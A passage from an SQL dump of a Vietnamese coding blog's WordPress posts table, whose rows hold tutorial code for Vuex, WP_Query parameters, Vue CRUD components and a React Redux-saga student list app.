const RootComponent = {\r\n            data() {\r\n                return { amount: 1 }\r\n            },\r\n            methods: {\r\n                increment() {\r\n                    //Dispatch 1 action trên store với payload {amount}\r\n                    this.$store.dispatch(\'increment\', { amount: this.amount })\r\n                },\r\n                decrement() {\r\n                    this.$store.dispatch(\'decrement\', { amount: this.amount })\r\n                }\r\n            },\r\n            computed: {\r\n                count() {\r\n                    return this.$store.getters.countFix(3);\r\n                }\r\n            }\r\n        }\r\n\r\n        const app = Vue.createApp(RootComponent).use(store).mount(\"#app\")\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'Vuex - Count: Simple Component', '', 'publish', 'open', 'open', '', 'vuex-count-simple-component', '', '', '2022-11-03 07:22:52', '2022-11-03 07:22:52', '', 0, 'https://duycode.com/?p=1640', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1643, 1, '2021-07-30 18:07:59', '2021-07-30 11:07:59', '<pre>\n// Source: https://gist.github.com/luetkemj/2023628\n// Xem hướng dẫn WP_Query toàn tập: http://goo.gl/kRpzTz\n<?php\n$args = array( \n  \n//////Author Parameters - Tham số lấy bài viết theo tác giả\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Author_Parameters\n    \'author\' => \'1,2,3,\',                     //(int) - Các ID tác giả cần lấy bài viết (thêm dấu - vào để loại trừ tác giả, ví dụ: -14, -20)\n    \'author_name\' => \'luetkemj\',              //(string) - Lấy bài viết dựa theo tên nick name của tác giả\n    \'author__in\' => array( 2, 6 ),            //(array) - Lấy bài dựa theo ID của tác giả\n    \'author__not_in\' => array( 2, 6 ),        //(array)\' - Các ID của tác giả không muốn lấy bài\n  \n//////Category Parameters - Tham số lấy bài viết dựa theo category\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Category_Parameters\n    \'cat\' => 5,//(int) - Lấy bài dựa theo ID của category\n    \'category_name\' => \'staff, news\',          //(string) - Lấy bài dựa theo category slug\n    \'category__and\' => array( 2, 6 ),         //(array) - Lấy bài mà nó mang cả hai category 2 và 6 (ID)\n    \'category__in\' => array( 2, 6 ),          //(array) - ID của các category không muốn lấy bài\n    \'category__not_in\' => array( 2, 6 ),      //(array) - Các ID của category không muốn lấy bài\n     \n//////Tag Parameters - Tham số lấy bài viết dựa theo tag\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Tag_Parameters\n    \'tag\' => \'cooking\',                       //(string) - Lấy bài viết theo tag slug\n    \'tag_id\' => 5,                            //(int) - Lấy bài viết theo tag ID\n    \'tag__and\' => array( 2, 6),               //(array) - Lấy bài viết mà nó mang cả hai tag có ID 2 và 6\n    \'tag__in\' => array( 2, 6),                //(array) - Lấy tất cả bài viết trong nhiều tag ID khác nhau\n    \'tag__not_in\' => array( 2, 6),            //(array) - Các tag ID không muốn lấy bài\n    \'tag_slug__and\' => array( \'red\', \'blue\'), //(array) - Lấy bài viết mà nó mang cả hai tag có slug red và blue\n    \'tag_slug__in\' => array( \'red\', \'blue\'),  //(array) - Lấy bài viết trong nhiều tag slug khác nhau\n  \n//////Taxonomy Parameters - Lấy bài viết dựa theo taxonomy\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Taxonomy_Parameters\n    //Quan trọng: tax_query là tham số có thể sẽ chứa nhiều mảng lồng vào bên trong\n    \'tax_query\' => array(                     //(array) - Lấy bài viết dựa theo taxonomy\n    \'relation\' => \'AND\',                      //(string) - Mối quan hệ giữa các tham số bên trong, AND hoặc OR\n      array(\n        \'taxonomy\' => \'color\',                //(string) - Tên của taxonomy\n        \'field\' => \'slug\',                    //(string) - Loại field cần xác định term của taxonomy, sử dụng \'id\' hoặc \'slug\'\n        \'terms\' => array( \'red\', \'blue\' ),    //(int/string/array) - Slug của các terms bên trong taxonomy cần lấy bài\n        \'include_children\' => true,           //(bool) - Lấy category con, true hoặc false\n        \'operator\' => \'IN\'                    //(string) - Toán tử áp dụng cho mảng tham số này. Sử dụng \'IN\' hoặc \'NOT IN\'\n      ),\n      array(\n        \'taxonomy\' => \'actor\',\n        \'field\' => \'id\',\n        \'terms\' => array( 103, 115, 206 ),\n        \'include_children\' => false,\n        \'operator\' => \'NOT IN\'\n      )\n    ),\n\n//////Post & Page Parameters - Lấy bài viết dựa vào tham số của Post hoặc Page\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Post_.26_Page_Parameters\n    \'p\' => 1,                               //(int) - ID của post cần hiển thị\n    \'name\' => \'hello-world\',                //(string) - Slug của post cần hiển thị\n    \'page_id\' => 1,                         //(int) - ID của page cần hiển thị\n    \'pagename\' => \'sample-page\',            //(string) - Slug của page cần hiển thị\n    \'pagename\' => \'contact_us/canada\',      //(string) - Hiển thị page con bằng slug của page mẹ và page con, cách nhau bởi dấu gạch chéo\n    \'post_parent\' => 1,                     //(int) - Lấy page con dựa vào ID của page mẹ\n    \'post_parent__in\' => array(1,2,3)       //(array) - Lấy nhiều page con dựa vào nhiều page mẹ thông qua ID\n    \'post_parent__not_in\' => array(1,2,3),  //(array) - Các ID của page mẹ không muốn hiển thị page con\n    \'post__in\' => array(1,2,3),             //(array) - Danh sách các post cần lấy, dùng ID\n    \'post__not_in\' => array(1,2,3),         //(array) - Danh sách các post không muốn lấy, dùng ID\n    //NOTE: Bạn không thể sử dụng \'post__in\' cùng với \'post__not_in\' trong một query\n\n//////Password Parameters - Lấy các bài viết dựa theo thiết lập mật khẩu của post\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Password_Parameters\n    \'has_password\' => true,                 //(bool) - Lấy các bài viết có đặt password\n                                              //true bài viết có pass \n                                              //false bài viết không có pass\n                                              //null Mặc định nó sẽ lấy toàn bộ post có pass và không có pass\n    \'post_password\' => \'multi-pass\',          //(string) - show posts with a particular password (available with Version 3.9)\n\n//////Type - Hiển thị post dựa vào loại post \n    //http://codex.wordpress.org/Class_Reference/WP_Query#Type_Parameters\n    \'post_type\' => array(                   //(string / array) - tên post type cần lấy bài viết. Mặc định là \'post\'\n            \'post\',                         // -  post.\n            \'page\',                         // - page.\n            \'revision\',                     // - revision.\n            \'attachment\',                   // - tập tin đính kèm. \n            \'my-post-type\',                 // - Tên custom post type\n            ),\n    \'post_type\' => \'any\',                   // - Lấy bất kỳ post type đang có trên website\n\n//////Status Parameters - Lấy các bài viết dựa theo trạng thái của nó\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Status_Parameters\n    \'post_status\' => array(                 //(string / array)       \n            \'publish\',                      // - Post hoặc Page đã được publish\n            \'pending\',                      // - Post đang ở trạng thái Pending Review\n            \'draft\',                        // - Post đang trong nháp\n            \'auto-draft\',                   // - Các bài viết tự động lưu nháp\n            \'future\',                       // - Bài viết đang được đặt thời gian đăng trong tương lai\n            \'private\',                      // - Bài viết đang trong trạng thái riêng tư\n            \'inherit\',                      // - Lấy một bản revision\n            \'trash\'                         // - Lấy post từ thùng rác\n            ),\n    \'post_status\' => \'any\',                 // - Sử dụng bất kỳ trạng thái nào\n\n\n    \n//////Pagination Parameters\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Pagination_Parameters\n    \'posts_per_page\' => 10,                 //(int) - Số lượng bài viết cần lấy ra để hiển thị trên mỗi trang. Nếu muốn hiển thị toàn bộ thì đặt giá trị là -1\n    \'posts_per_archive_page\' => 10,         //(int) - Số lượng bài viết cần lấy ra hiển thị trên mỗi trang. Nhưng chỉ sử dụng cho các trang lưu trữ.\n    \'nopaging\' => false,                    //(bool) - Nếu muốn sử dụng phân trang thì đặt là false. True sẽ hiển thị tất cả post. Mặc định là false.\n    \'paged\' => get_query_var(\'paged\'),      //(int) - Số trang hiện tại.\n                                            //NOTE: Sử dụng get_query_var(\'page\') nếu bạn cần sử dụng nó ở một Custom Page Template\n    										// http://codex.wordpress.org/Function_Reference/next_posts_link#Usage_when_querying_the_loop_with_WP_Query\n                                            // http://codex.wordpress.org/Pagination#Troubleshooting_Broken_Pagination\n    \'offset\' => 3,                          // (int) - Số bài viết trước đó mà bạn muốn bỏ qua.\n                                            // Warning: Thiết lập này sẽ làm cho phần phân trang bị lỗi, xem thêm: http://codex.wordpress.org/Making_Custom_Queries_using_Offset_and_Pagination\n    										// Nếu tham số \'posts_per_page\' có giá trị là -1 thì offset sẽ bị bỏ qua.\n\n                                            \n    \'page\' => get_query_var(\'page\'),        // (int) - Số trang hiện tại sử dụng cho Custom Page Template.\n                                            \n    \'ignore_sticky_posts\' => false,         // (boolean) - Tuỳ chọn có lấy bài viết được Sticky hay không. Nếu false thì sẽ hiển thị, true thì bỏ qua.\n\n	//////Order & Orderby Parameters - Thiết lập kiểu sắp xếp các bài viết\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Order_.26_Orderby_Parameters\n    \'order\' => \'DESC\',                      //(string) - Thiết lập hiển thị tăng dần hay giảm dần.\n                                              //Possible Values:\n                                              //\'ASC\' - Hiển thị kiểu tăng dần (1, 2, 3; a, b, c).\n                                              //\'DESC\' - Hiển thị kiểu giảm dần (3, 2, 1; c, b, a).\n    \'orderby\' => \'date\',                    //(string) - Thiết lập loại dữ liệu sẽ được sắp xếp dựa vào. Mặc định nó sẽ là tham số \'date\' để dựa vào ngày đăng bài.\n                                              //Possible Values:\n                                              //\'none\' - Không sắp xếp\n                                              //\'ID\' - Sắp xếp bởi ID bài viết\n                                              //\'author\' - Sắp xếp bởi tác giả\n                                              //\'title\' - Sắp xếp bởi tiêu đề\n                                              //\'name\' - Sắp xếp bởi slug\n                                              //\'date\' - Sắp xếp bởi ngày tháng\n                                              //\'modified\' - Sắp xếp bởi ngày cập nhật\n                                              //\'parent\' - Sắp xếp bởi ID của page mẹ\n                                              //\'rand\' - Sắp xếp ngaẫu nhiên\n                                              //\'comment_count\' - Sắp xếp bởi số lượng bình luận\n                                              //\'menu_order\' - Sắp xếp bởi thứ tự của trang\n                                              //\'meta_value\' - Sắp xếp bởi giá trị meta data\n                                              //\'meta_value_num\' - Sắp xếp bởi giá trị dạng số tự nhiên của meta data\n																							 \n//////Date Parameters - Lấy bài viết trong khoảng thời gian cố định\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Date_Parameters\n\n    \'date_query\' => array(                  //(array) - Date parameters (available with Version 3.7).\n                                              //these are super powerful. check out the codex for more comprehensive code examples http://codex.wordpress.org/Class_Reference/WP_Query#Date_Parameters\n      array(\n	    \'year\' => 2014,                         //(int) - năm cần lấy bài (e.g. 2011).\n	    \'monthnum\' => 4,                        //(int) - Tháng cần lấy bài (from 1 to 12).\n	    \'w\' =>  25,                             //(int) - Số tuần trong năm cần lấy bài (từ 0 đến 53).\n	    \'day\' => 17,                            //(int) - Lấy bài dựa theo ngày trong tháng (từ 1 đến 31).\n	    \'hour\' => 13,                           //(int) - Lấy bài dựa theo giờ trong ngày (từ 0 đến 23).\n	    \'minute\' => 19,                         //(int) - Lấy bài dựa theo phút trong giờ (từ 0 đến 60).\n	    \'second\' => 30,                         //(int) - Lấy bài dựa theo giây trong phút (0 đến 60).\n	    \'m\' => 201404,                          //(int) - Tháng của năm cần lấy bài (Ví dụ: 201307).\n        \'after\'     => \'January 1st, 2013\', //(string/array) - Lấy bài viết sau ngày cố định. Có thể sử dụng strtotime()-compatible string, hoặc sử dụng array gồm \'year\', \'month\', \'day\'\n        \'before\'    => array(               //(string/array) - Lấy bài viết trước ngày cố định. Có thể sử dụng strtotime()-compatible string, hoặc sử dụng array gồm \'year\', \'month\', \'day\'\n          \'year\'  => 2013,                  \n          \'month\' => 2,                     \n          \'day\'   => 28,                    \n        ),\n        \'inclusive\' => true,                //(boolean) - Nếu sử dụng before và after, sử dụng \'true\' nếu muốn bao gồm cả hai tham số.\n        \'compare\' =>  \'=\',                  //(string) - So sánh giá trị với \'=\', \'!=\', \'>\', \'>=\', \'<\', \'<=\', \'LIKE\', \'NOT LIKE\', \'IN\', \'NOT IN\', \'BETWEEN\', \'NOT BETWEEN\', \'EXISTS\' (only in WP >= 3.5), and \'NOT EXISTS\' (also only in WP >= 3.5). Default value is \'=\'\n        \'column\' => \'post_date\',            //(string) - Cột dữ liệu mà cần gửi query đến, mặc định là \'post_date\'\n        \'relation\' => \'AND\',                //(string) - OR hoặc AND, sử dụng khi có nhiều array trong date_query để tạo mối quan hệ\n      ),\n    ),\n\n//////Custom Field Parameters - Lấy bài viết dựa theo custom field\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Custom_Field_Parameters\n    \'meta_key\' => \'key\',                    //(string) - Lấy bài dựa theo meta key của custom field\n    \'meta_value\' => \'value\',                //(string) - Lấy bài dựa theo giá trị của custom field\n    \'meta_value_num\' => 10,                 //(number) - Giá trị của custom field dạng số tự nhiên\n    \'meta_compare\' => \'=\',                  //(string) - Toán tử để so sánh với \'meta_value\'. Có thể sử dụng \'!=\', \'>\', \'>=\', \'<\', or =\'. Mặc định là \'=\'.\n    \'meta_query\' => array(                  //(array)  - Sử dụng nhiều điều kiện lấy bài viết theo custom field \n       \'relation\' => \'AND\',                 //(string) - Mối quan hệ của các array query bên trong, sử dụng \'OR\' hoặc \'AND\'\n       array(\n         \'key\' => \'color\',                  //(string) - Tên meta key\n         \'value\' => \'blue\'                  //(string/array) - Giá trị meta value\n         \'type\' => \'CHAR\',                  //(string) - Loại giá trị. Có thể sử dụng \'NUMERIC\', \'BINARY\', \'CHAR\', \'DATE\', \'DATETIME\', \'DECIMAL\', \'SIGNED\', \'TIME\', \'UNSIGNED\'. Mặc định là \'CHAR\'. Tham số \'type\' DATE chỉ có thể hoạt động với tham số \'compare\' nếu định dạng ngày tháng được sử dụng là YYYYMMDD.\n                                            \n         \'compare\' => \'=\'                   //(string) - Toán tử so sánh với giá trị value trong mảng này. Có thể sử dụng \'=\', \'!=\', \'>\', \'>=\', \'<\', \'<=\', \'LIKE\', \'NOT LIKE\', \'IN\', \'NOT IN\', \'BETWEEN\', \'NOT BETWEEN\', \'EXISTS\' (only in WP >= 3.5), and \'NOT EXISTS\' (also only in WP >= 3.5). Default value is \'=\'.\n       ),\n       array(\n         \'key\' => \'price\',\n         \'value\' => array( 1,200 ),\n         \'compare\' => \'NOT LIKE\'\n       )\n    ), \n\n//////Caching Parameters\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Caching_Parameters\n    //NOTE Caching is a good thing. Setting these to false is generally not advised.\n    \'cache_results\' => true,                //(bool) Mặc định là true - Lưu cache của thông tin kết quả query\n    \'update_post_term_cache\' => true,       //(bool) Default is true - Post meta information cache.\n    \'update_post_meta_cache\' => true,       //(bool) Default is true - Post term information cache.\n    \n    \'no_found_rows\' => false,               //(bool) Xem thêm: http://flavio.tordini.org/speed-up-wordpress-get_posts-and-query_posts-functions\n    \n\n//////Search Parameter - Lấy bài viết dựa theo truy vấn tìm kiếm\n    //http://codex.wordpress.org/Class_Reference/WP_Query#Search_Parameter\n    \'s\' => $s,                              //(string) - Từ khoá tìm kiếm bài viết. $s chính là biến lưu từ khoá truy vấn tìm kiếm khi tìm thông qua form tìm kiếm.\n    \'exact\' => true,                        //(bool) - Tìm nội dung khớp chính xác với từ khoá tìm kiếm\n    \'sentence\' => true,                     //(bool) - Sử dụng tìm kiếm trong cụm từ\n         \n\n\n);\n\n$the_query = new WP_Query( $args );\n\n// The Loop\nif ( $the_query->have_posts() ) :\nwhile ( $the_query->have_posts() ) : $the_query->the_post();\n  // Do Stuff\nendwhile;\nendif;\n\n// Reset Post Data\nwp_reset_postdata();\n\n?>\n</pre>', 'Wordpress - Các tham số Query bài viết trong WP_Query', '', 'publish', 'open', 'open', '', 'wordpress-cac-tham-so-query-bai-viet-trong-wp_query', '', '', '2021-07-30 18:07:59', '2021-07-30 11:07:59', '', 0, 'https://duycode.com/?p=1643', 0, 'post', '', 0),
(1646, 1, '2022-10-01 01:00:34', '2022-10-01 01:00:34', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vue: Basic CRUD</title>\r\n    <style>\r\n        table {\r\n            border-collapse: collapse;\r\n        }\r\n\r\n        th,\r\n        td {\r\n            padding: 0 0.5rem;\r\n            border: 1px solid black;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\">\r\n        <button v-on:click=\"student={ username: \'\', email: \'\', id: \'\' }\">New Student</button><br />\r\n        <input type=\"text\" placeholder=\"username\" v-model=\"student.username\" /><br />\r\n        <input type=\"text\" placeholder=\"email\" v-model=\"student.email\" /><br />\r\n        <button @click=\"saveStudent\">{{student.id ? \'Update Student\':\'Create Student\'}}</button><br /><br />\r\n        <input type=\"text\" placeholder=\"Search...\" v-model=\"filter\">\r\n        <button @click=\"filter=\'\'\">x</button>\r\n        <table>\r\n            <thead>\r\n                <tr>\r\n                    <th>#</th>\r\n                    <th>Id</th>\r\n                    <th>User</th>\r\n                    <th>Email</th>\r\n                    <th>Actions</th>\r\n                </tr>\r\n            </thead>\r\n            <tbody>\r\n                <tr v-for=\"(item, index) in filterStudent\" :key=\"index\">\r\n                    <td>{{index + 1}}</td>\r\n                    <td>{{item.id}}</td>\r\n                    <td>{{item.username}}</td>\r\n                    <td>{{item.email}}</td>\r\n                    <td>\r\n                        <button @click=\"editStudent(item.id)\">Edit</button>\r\n                        <button @click=\"deleteStudent(item.id)\">Delete</button>\r\n                    </td>\r\n                </tr>\r\n            </tbody>\r\n        </table>\r\n    </div>\r\n\r\n    <!-- <script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script> -->\r\n    <script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n\r\n    <script>\r\n        const uuid = () => Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1)\r\n\r\n        const RootComponent = {\r\n            data() {\r\n                return {\r\n                    listStudent: [],\r\n                    student: { username: \'\', email: \'\', id: \'\' },\r\n                    filter: \"\",\r\n                }\r\n            },\r\n            methods: {\r\n                saveStudent() {\r\n                    if (!this.student.id) {\r\n                        this.student.id = uuid();\r\n                        this.listStudent.push({ ...this.student })\r\n                    } else {\r\n                        let find_student = this.listStudent.find(item => item.id == this.student.id);\r\n                        find_student.username = this.student.username;\r\n                        find_student.email = this.student.email;\r\n                    }\r\n                    this.student = { username: \'\', email: \'\', id: \'\' }\r\n                },\r\n                editStudent(id) {\r\n                    let find_student = this.listStudent.find(item => item.id == id);\r\n                    this.student = { ...find_student };\r\n                },\r\n                deleteStudent(id) {\r\n                    this.listStudent = this.listStudent.filter(item => item.id !== id)\r\n                }\r\n            },\r\n            computed: {\r\n                filterStudent() {\r\n                    return this.listStudent.filter(item => item.username.includes(this.filter))\r\n                }\r\n            }\r\n        }\r\n\r\n        Vue.createApp(RootComponent).mount(\"#app\")\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'CRUD - StudentList in one Component', '', 'publish', 'open', 'open', '', 'crud-studentlist-in-one-component', '', '', '2022-11-03 09:34:28', '2022-11-03 09:34:28', '', 0, 'https://duycode.com/?p=1646', 0, 'post', '', 0),
(1650, 1, '2022-10-01 02:00:56', '2022-10-01 02:00:56', '<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>Vue: Basic CRUD</title>\r\n    <style>\r\n        table {\r\n            border-collapse: collapse;\r\n        }\r\n\r\n        th,\r\n        td {\r\n            padding: 0 0.5rem;\r\n            border: 1px solid black;\r\n        }\r\n    </style>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"app\"></div>\r\n\r\n    <!-- <script src=\"https://unpkg.com/vue@3/dist/vue.global.js\"></script> -->\r\n    <script src=\"https://unpkg.com/vue@3.2.41/dist/vue.global.js\"></script>\r\n\r\n    <script>\r\n        const uuid = () => Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);\r\n\r\n        const ComponentA = {\r\n            props: {\r\n                props_saveStudent: {\r\n                    type: Function,\r\n                },\r\n                student: Object,\r\n            },\r\n            template: `<div>\r\n                        <button v-on:click=\"$emit(\'sendStudent\',{ username:\'\',email:\'\',id:\'\'})\">\r\n                            New Student\r\n                        </button><br />\r\n                        <input type=\"text\" placeholder=\"username\" v-model=\"student.username\" /><br />\r\n                        <input type=\"text\" placeholder=\"email\" v-model=\"student.email\" /><br />\r\n                        <button @click=\"saveStudent\">{{student.id ? \'Update Student\':\'Create Student\'}}\r\n                        </button><br /><br />\r\n                    </div>`,\r\n            methods: {\r\n                saveStudent() {\r\n                    if (!this.student.username || !this.student.email) return;\r\n                    this.props_saveStudent(this.student);\r\n                }\r\n            },\r\n        }\r\n        const ComponentB = {\r\n            data() {\r\n                return { filter: \"\", }\r\n            },\r\n            props: {\r\n                props_listStudent: Array,\r\n                props_deleteStudent: Function,\r\n            },\r\n            template: `<div>\r\n                        <input type=\"text\" placeholder=\"Search...\" v-model=\"filter\">\r\n                        <button @click=\"filter=\'\'\">x</button>\r\n                        <table>\r\n                            <thead>\r\n                                <tr>\r\n                                    <th>#</th>\r\n                                    <th>User</th>\r\n                                    <th>Email</th>\r\n                                    <th>Actions</th>\r\n                                </tr>\r\n                            </thead>\r\n                            <tbody>\r\n                                <tr v-for=\"(item, index) in filterStudent\" :key=\"index\">\r\n                                    <td>{{index + 1}}</td>\r\n                                    <td>{{item.username}}</td>\r\n                                    <td>{{item.email}}</td>\r\n                                    <td>\r\n                                        <button @click=\"$emit(\'sendStudent\', {...item})\">Edit</button>\r\n                                        <button @click=\"props_deleteStudent(item.id)\">Delete</button>\r\n                                    </td>\r\n                                </tr>\r\n                            </tbody>\r\n                        </table>\r\n                    </div>`,\r\n            computed: {\r\n                filterStudent() {\r\n                    return this.props_listStudent.filter(item => item.username.includes(this.filter))\r\n                }\r\n            },\r\n        }\r\n\r\n        const RootComponent = {\r\n            template: `<component-a \r\n                            :student = \"student\"\r\n                            :props_saveStudent=\"saveStudent\" \r\n                            @sendStudent=\"student=$event\"\r\n                        />\r\n                    <component-b \r\n                        :props_listStudent=\"listStudent\"\r\n                        :props_deleteStudent=\"deleteStudent\"\r\n                        @sendStudent=\"student=$event\"\r\n                    />`,\r\n\r\n            data() {\r\n                return {\r\n                    student: { username: \'\', email: \'\', id: \'\' },\r\n                    listStudent: [{ username: \'name-random\', email: \'email-random\', id: \'123123\' }],\r\n                    filter: \"\",\r\n                }\r\n            },\r\n\r\n            components: {\r\n                \"component-a\": ComponentA,\r\n                \"component-b\": ComponentB\r\n            },\r\n            methods: {\r\n                saveStudent(student) {\r\n                    if (!student.id) {\r\n                        student.id = uuid();\r\n                        this.listStudent.push({ ...student })\r\n                    } else {\r\n                        let find_student = this.listStudent.find(item => item.id == this.student.id);\r\n                        find_student.username = this.student.username;\r\n                        find_student.email = this.student.email;\r\n                    }\r\n                    this.student = { username: \'\', email: \'\', id: \'\' };\r\n                },\r\n                deleteStudent(id) {\r\n                    this.listStudent = this.listStudent.filter(item => item.id !== id)\r\n                },\r\n            },\r\n        }\r\n\r\n        Vue.createApp(RootComponent).mount(\"#app\")\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'CRUD - StudentList in multiple Component', '', 'publish', 'open', 'open', '', 'crud-studentlist-in-multiple-component', '', '', '2022-11-03 09:38:56', '2022-11-03 09:38:56', '', 0, 'https://duycode.com/?p=1650', 0, 'post', '', 0),
(1662, 1, '2021-06-29 05:00:31', '2021-06-28 22:00:31', '<img src=\"https://miro.medium.com/max/875/1*QERgzuzphdQz4e0fNs1CFQ.gif\" alt=\"\" />\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\" />\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    <title>ReactJS</title>\n    <style>\n        table {\n            border-collapse: collapse;\n        }\n\n        th,\n        td {\n            padding: 0 0.5rem;\n            border: 1px solid black;\n        }\n    </style>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/redux/4.1.0/redux.js\"></script>\n    <script src=\"https://cdnjs.cloudflare.com/ajax/libs/react-redux/7.2.4/react-redux.js\"></script>\n\n    <script src=\"https://cdn.jsdelivr.net/npm/@reduxjs/toolkit@1.6.0/dist/redux-toolkit.umd.min.js\"></script>\n    <script src=\"https://unpkg.com/redux-saga@1.1.3/dist/redux-saga.umd.js\"></script>\n    <!-- =========== src/utils.js =========== -->\n    <script>\n        class Uuid {\n            s4() {\n                return Math.floor((1 + Math.random()) * 0x10000)\n                    .toString(16)\n                    .substring(1);\n            }\n            s16() {\n                return this.s4() + this.s4() + this.s4() + this.s4();\n            }\n        }\n        let uuid = new Uuid();\n    </script>\n\n    <!-- =========== slices/listStudent_slice.js =========== -->\n    <script>\n        //Dùng RTK.createSlice khai báo tất cả State, Reducers và Actions luôn\n        let listStudent_local = JSON.parse(localStorage.getItem(\'listStudent\')) || { data: [], loading: false };\n        const listStudent_slice = RTK.createSlice({\n            name: \'listStudent\',\n            initialState: listStudent_local,\n            reducers: {\n                action_saveStudent(state, action) {\n                    if (!action.payload.id) {\n                        let new_student = {\n                            id: uuid.s16(),\n                            username: action.payload.username,\n                            email: action.payload.email,\n                        };\n                        state.data.push(new_student);\n\n                    } else {\n                        let find_student = state.data.find(({id}) => id == action.payload.id);\n                        find_student.username = action.payload.username;\n                        find_student.email = action.payload.email;\n                    }\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                action_deleteStudent(state, action) {\n                    state.data = state.data.filter(({id}) => id != action.payload);\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                action_setListStudent(state, action) {\n                    state.data = action.payload.map(item => ({\n                        username: item.username,\n                        email: item.email,\n                        id: item.id,\n                    }))\n                    state.loading = false;\n                    localStorage.setItem(\'listStudent\', JSON.stringify(state));\n                    return state;\n                },\n                //action này nhận nhiệm vụ, nhưng không làm gì,\n                //nghĩa là khi đi qua nó, middleware nhận ra nó thì sẽ làm việc gì đó khác\n                action_saga_getStudents(state, action) {\n                    state.loading = true;\n                    return state;\n                },\n            }\n        });\n        // export ra các actions, reducer tương ứng :D\n        const { action_saveStudent, action_deleteStudent, action_setListStudent, action_saga_getStudents } = listStudent_slice.actions;\n        const listStudent_reducer = listStudent_slice.reducer;\n    </script>\n\n    <!-- =========== src/api/studentAPI =========== -->\n    <script type=\"text/babel\">\n        //API cần để riêng 1 file\n        // Hàm này được button dispatch lên, trong quá trình chạy, nó lại dispatch 1 action khác\n        const getStudentsOnline = (url) => async (dispatch) => {\n            console.log(\"url: \", url);\n            let response = await fetch(url);\n            let responseJSON = await response.json();\n            dispatch(action_setListStudent(responseJSON));\n        }\n    </script>\n\n    <script>\n        // Các Effect Creator của saga hay gặp\n        // takeEvery: luôn chạy\n        // takeLatest: chạy action cuối, các action bị ghi đè sẽ cancel\n        // takeLeading: ngược lại, chạy action đầu, các action sau định ghi đè thì bị cancel\n        // debounce, throttle, fork, retry, put   ...\n        const productSaga = function* () {\n            //Các saga thông thường chỉ chạy 1 lần khi khởi động được rootSaga chạy\n            //Sử dụng takeEvery để lắng nghe liên tục và bắt các sự kiện khi có action gửi lên, chứ saga này không chạy lại nữa\n            // => (\'*\') => lắng nghe mọi action\n\n            // console.log(\"Product saga\");\n            // yield ReduxSaga.effects.takeEvery(\'*\', handle_getProductsOnline)\n        }\n\n        const handle_getStudentsOnline = function* (action) {\n            console.log(\'Watting 1s\', action);\n            yield ReduxSaga.effects.delay(1000)\n            console.log(\'Watiing done\');\n            let url = action.payload;\n            let response = yield fetch(url);\n            let responseJSON = yield response.json();\n            yield ReduxSaga.effects.put(action_setListStudent(responseJSON))\n        }\n\n        const studentSaga = function* () {\n            //console.log(\"student saga\");\n            // Liên tục lắng nghe 1 action và phản ứng với nó bằng takeEvery\n            // action.type được khai báo bằng 2 cách: dùng chuỗi: \"reducer_name/action_function_name\" hoặc \"action_function().type\"\n            // => Khi gặp action.type ==> chạy hàm phản ứng \"logStudent\"\n            // yield ReduxSaga.effects.takeEvery(\'listStudent/action_deleteStudent\', logStudent)\n            yield ReduxSaga.effects.takeEvery(action_saga_getStudents().type, handle_getStudentsOnline)\n        }\n        const rootSaga = function* () {\n            // console.log(\"Root saga\");\n            // RootSaga sẽ khởi chạy tất cả các saga khác lần đầu tiên khi khởi động\n            yield ReduxSaga.effects.all([productSaga(), studentSaga()])\n        }\n    </script>\n\n    <!-- =========== src/store.js =========== -->\n    <script>\n        //Khai báo sagaMiddleware (xem thêm trên trang chủ cách khai báo khi sử dụng npm install)\n        const sagaMiddleware = ReduxSaga.default();\n\n        //Khai báo store với ReduxToolkit như ở dưới đây\n        //ReduxToolkit đã cài đặt sẵn middlewareThunk và Redux devtools extension rồi, ko cần cài đặt gì thêm nữa\n        const store = RTK.configureStore({\n            reducer: {\n                listStudent: listStudent_reducer,\n                //product: 